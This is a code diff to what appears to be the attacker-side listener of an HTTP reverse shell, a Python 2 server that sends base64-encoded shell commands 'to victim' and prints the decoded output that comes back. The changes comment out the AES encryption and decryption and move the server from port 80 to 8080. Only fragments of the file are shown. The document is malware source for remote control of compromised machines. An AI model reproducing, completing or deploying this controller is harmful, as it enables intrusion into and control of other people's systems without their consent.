@@ -61,8 +61,8 @@ class GetHandler(BaseHTTPRequestHandler):
         	self.send_response(200)
 		# end headers
         	self.end_headers()
-		# encrypt the message
-		message = EncodeAES(cipher, message)
+#		# encrypt the message
+#		message = EncodeAES(cipher, message)
 		# base64 it
 		message = base64.b64encode(message)
 		# write our command shell param to victim
@@ -87,15 +87,15 @@ class GetHandler(BaseHTTPRequestHandler):
                 url=url.replace("cmd=", "")
 		# base64 decode
 		message = base64.b64decode(url)
-		# decrypt the string
-		message = DecodeAES(cipher, message)
+#		# decrypt the string
+#		message = DecodeAES(cipher, message)
 		# display the command back decrypted
 		print message
 
 if __name__ == '__main__':
 
 	# bind to all interfaces
-    	server = HTTPServer(('', 80), GetHandler)
+    	server = HTTPServer(('', 8080), GetHandler)
 	print """############################################
 #
 #
